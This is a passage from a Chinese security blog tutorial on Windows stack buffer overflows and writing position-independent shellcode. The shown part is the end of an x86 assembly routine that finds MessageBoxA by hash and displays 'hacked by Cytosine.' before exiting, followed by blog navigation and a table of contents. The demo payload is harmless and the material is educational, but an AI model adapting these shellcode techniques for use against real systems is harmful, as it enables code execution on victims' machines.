与MessageBoxA的hash值进行比较</div><div class="line">	         jne  find_lib_functions</div><div class="line">	     </div><div class="line">	     // ==== 主函数内容，用于显示对话框 ====</div><div class="line">	     function_call:</div><div class="line">	         xor ebx,ebx</div><div class="line">	         </div><div class="line">	         push ebx         // &quot;Warning&quot;字符串后面的00，表示字符串结尾</div><div class="line">	         push 0x20676e69</div><div class="line">	         push 0x6e726157  // &quot;Warning&quot;倒序入栈</div><div class="line">	         mov eax,esp      //当前栈指针寄存器的值给eax，也就是保存字符串&quot;Warning&quot;的起始地址</div><div class="line">			</div><div class="line">	         push ebx         // &quot;hacked by Cytosine.&quot;字符串后面的00</div><div class="line">	         push 0x202e656e</div><div class="line">	         push 0x69736f74</div><div class="line">	         push 0x79432079</div><div class="line">	         push 0x62206465</div><div class="line">	         push 0x6b636168  // &quot;hacked by Cytosine.&quot;倒序入栈</div><div class="line">	         mov ecx,esp      //保存字符串&quot;hacked by Cytosine.&quot;的起始地址</div><div class="line"></div><div class="line">	         // call MessageBox()</div><div class="line">	         push ebx   		// 00</div><div class="line">	         push eax   		// &quot;Warning&quot;的起始地址</div><div class="line">	         push ecx   		// &quot;hacked by Cytosine.&quot;的起始地址</div><div class="line">	         push ebx</div><div class="line">	         call [edi-0x04]	// 调用MessageBoxA</div><div class="line">			</div><div class="line">	         //call ExitProcess()</div><div class="line">	         push ebx     		// ExitProcess有一个参数，参数为0</div><div class="line">	         call [edi-0x08]	// 调用ExitProcess</div><div class="line">	 &#125;</div><div class="line">	 return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>编译，OD机器码复制出来，手动删掉前面后面没用的，得到十六进制shellcode：</p>
<p><img src="37.png" alt=""></p>
<p><img src="38.png" alt=""></p>
<p><img src="39.png" alt=""></p>
<p>完整验证代码：</p>
<p><img src="40.png" alt=""></p>
<p><img src="41.png" alt=""></p>
<p><img src="42.png" alt=""></p>
<p><img src="43.png" alt=""></p>
<p>运行结果：</p>
<p><img src="44.png" alt=""></p>

      
    </div>
    
    
    

    

    
      <div>
        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
  <div>窝很可爱，请给窝钱</div>
  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
    <span>赞赏</span>
  </button>
  <div id="QR" style="display: none;">

    
      <div id="wechat" style="display: inline-block">
        <img id="wechat_qr" src="/images/wechat.png" alt="Cytosine 微信支付"/>
        <p>微信支付</p>
      </div>
    

    
      <div id="alipay" style="display: inline-block">
        <img id="alipay_qr" src="/images/alipay.jpg" alt="Cytosine 支付宝"/>
        <p>支付宝</p>
      </div>
    

    

  </div>
</div>

      </div>
    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/Pwn/" rel="tag"># Pwn</a>
          
            <a href="/tags/Notes/" rel="tag"># Notes</a>
          
            <a href="/tags/Stackoverflow/" rel="tag"># Stackoverflow</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2018/08/09/Installation-mac-php-switcher/" rel="next" title="Mac下快速切换php版本">
                <i class="fa fa-chevron-left"></i> Mac下快速切换php版本
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2018/08/16/c-printf-syntactic-sugar/" rel="prev" title="2$——printf中的语法糖">
                2$——printf中的语法糖 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/avatar.webp"
                alt="Cytosine" />
            
              <p class="site-author-name" itemprop="name">Cytosine</p>
              <p class="site-description motion-element" itemprop="description">智能是人类未来之光，安全是人类基本需求</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives">
              
                  <span class="site-state-item-count">26</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">35</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          
            <div class="feed-link motion-element">
              <a href="/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          <div class="links-of-author motion-element">
            
              
                <span class="links-of-author-item">
                  <a href="https://github.com/Lovegood" target="_blank" title="GitHub">
                    GitHub</a>
                </span>
              
                <span class="links-of-author-item">
                  <a href="https://www.zhihu.com/people/CytosineLovegood/activities" target="_blank" title="知乎">
                    知乎</a>
                </span>
              
                <span class="links-of-author-item">
                  <a href="https://zhuanlan.zhihu.com/dashijian" target="_blank" title="安全大事件">
                    安全大事件</a>
                </span>
              
                <span class="links-of-author-item">
                  <a href="https://xuptsec.github.io/" target="_blank" title="XUPTSEC-blog">
                    XUPTSEC-blog</a>
                </span>
              
            
          </div>

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                from dalao import
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://exp101t.blogspot.com/" title="Murasaki" target="_blank">Murasaki</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://pcat.cnblogs.com/" title="pcat" target="_blank">pcat</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://flygon.net/" title="飞龙" target="_blank">飞龙</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://ju5tw4nty0u.top/" title="ju5tw4nty0u" target="_blank">ju5tw4nty0u</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://webdog.ml/" title="grt1st" target="_blank">grt1st</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.k0rz3n.com/" title="K0rz3n" target="_blank">K0rz3n</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://skysec.top/" title="一叶飘零" target="_blank">一叶飘零</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.lovei.org/" title="腹黑" target="_blank">腹黑</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://sec2hack.com/" title="Wfox" target="_blank">Wfox</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.codemonster.cn/" title="Xishir" target="_blank">Xishir</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://eternalsakura13.com/" title="Sakura" target="_blank">Sakura</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://math1as.com/" title="Math1as" target="_blank">Math1as</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://blog.thecosmos.cn/" title="Cosmos" target="_blank">Cosmos</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://blog.csdn.net/whklhhhh" title="奈沙夜影" target="_blank">奈沙夜影</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://blog.csdn.net/PeterZ1997/" title="PeterZ" target="_blank">PeterZ</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.virzz.com/" title="Virink" target="_blank">Virink</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://blog.changwei.me/" title="昌维" target="_blank">昌维</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://white.xmutsec.com" title="White" target="_blank">White</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://cismon.net/" title="CismonX" target="_blank">CismonX</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.lsafe.org/" title="lixin" target="_blank">lixin</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://wzsite.cn/" title="Wz" target="_blank">Wz</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.blogsir.com.cn/" title="江sir" target="_blank">江sir</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://greyd0g.github.io/" title="greyd0g" target="_blank">greyd0g</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://brucetg.github.io/" title="Brucetg" target="_blank">Brucetg</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.get1t.cn/" title="FraMeQ" target="_blank">FraMeQ</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.smallflower.xin/" title="小花" target="_blank">小花</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://iosmosis.github.io/" title="iosmosis" target="_blank">iosmosis</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://processor.pub/" title="Processor" target="_blank">Processor</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.lmxspace.com/" title="l1nk3r" target="_blank">l1nk3r</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.evi1s.com/index.php/links.html" title="Map1e" target="_blank">Map1e</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#缓冲区溢出的原理"><span class="nav-number">1.</span> <span class="nav-text">缓冲区溢出的原理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#判定main-函数地址"><span class="nav-number">1.1.</span> <span class="nav-text">判定main()函数地址</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#定位调用main-函数的语句"><span class="nav-number">1.2.</span> <span class="nav-text">定位调用main()函数的语句</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析call语句对栈空间的影响"><span class="nav-number">1.3.</span> <span class="nav-text">分析call语句对栈空间的影响</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析正常程序与存在溢出的程序，对栈空间的影响"><span class="nav-number">1.4.</span> <span class="nav-text">分析正常程序与存在溢出的程序，对栈空间的影响</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#正常程序"><span class="nav-number">1.4.1.</span> <span class="nav-text">正常程序</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#存在栈溢出的程序"><span class="nav-number">1.4.2.</span> <span class="nav-text">存在栈溢出的程序</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#缓冲区溢出的利用"><span class="nav-number">2.</span> <span class="nav-text">缓冲区溢出的利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#利用错误对话框，精确定位返回地址的位置"><span class="nav-number">2.1.</span> <span class="nav-text">利用错误对话框，精确定位返回地址的位置</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#本例"><span class="nav-number">2.1.1.</span> <span class="nav-text">本例</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#通用"><span class="nav-number">2.1.2.</span> <span class="nav-text">通用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ESP-栈指针寄存器"><span class="nav-number">2.2.</span> <span class="nav-text">ESP 栈指针寄存器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#寻找一个合适的地址用于覆盖原始地址-jmp-esp"><span class="nav-number">2.3.</span> <span class="nav-text">寻找一个合适的地址用于覆盖原始地址(jmp esp)</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#编写shellcode"><span class="nav-number">3.</span> <span class="nav-text">编写shellcode</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#获取MessageBox-amp-ExitProcess-的地址"><span class="nav-number">3.1.</span> <span class="nav-text">获取MessageBox()&ExitProcess()的地址</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Address-of-MessageBox"><span class="nav-number">3.1.1.</span> <span class="nav-text">Address of MessageBox()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Address-of-ExitProcess"><span class="nav-number">3.1.2.</span> <span class="nav-text">Address of ExitProcess()</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#编写汇编代码，实现函数调用"><span class="nav-number">3.2.</span> <span class="nav-text">编写汇编代码，实现函数调用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#函数调用-call"><span class="nav-number">3.2.1.</span> <span class="nav-text">函数调用 call</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#调用ExitProcess-0-的汇编代码："><span class="nav-number">3.2.2.</span> <span class="nav-text">调用ExitProcess(0)的汇编代码：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#调用MessageBox-的汇编代码："><span class="nav-number">3.2.3.</span> <span class="nav-text">调用MessageBox()的汇编代码：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#将汇编代码改写为shellcode，植入缓冲区"><span class="nav-number">3.3.</span> <span class="nav-text">将汇编代码改写为shellcode，植入缓冲区</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析"><span class="nav-number">3.4.</span> <span class="nav-text">分析</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#编写通用shellcode"><span class="nav-number">4.</span> <span class="nav-text">编写通用shellcode</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#利用hash程序计算函数名称的摘要"><span class="nav-number">4.1.</span> <span class="nav-text">利用hash程序计算函数名称的摘要</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#动态获取kernel32-dll在系统中的基址"><span class="nav-number">4.2.</span> <span class="nav-text">动态获取kernel32.dll在系统中的基址</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#WinDbg简单演示"><span class="nav-number">4.2.1.</span> <span class="nav-text">WinDbg简单演示</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#动态获取kernel32-dll地址的汇编代码"><span class="nav-number">4.2.2.</span> <span class="nav-text">动态获取kernel32.dll地址的汇编代码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#动态解析kernel32-dll的PE结构，获取导出表中的函数"><span class="nav-number">4.3.</span> <span class="nav-text">动态解析kernel32.dll的PE结构，获取导出表中的函数</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#理论分析"><span class="nav-number">4.3.1.</span> <span class="nav-text">理论分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#代码"><span class="nav-number">4.3.2.</span> <span class="nav-text">代码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#得到通用的shellcode"><span class="nav-number">4.4.</span> <span class="nav-text">得到通用的shellcode</span></a></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Cytosine</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a></div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>



  


  




	





  





  









<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script src="//unpkg.com/valine/dist/Valine.min.js"></script>



  





  

  

  

  
  

  

  

  

</body>
</html>
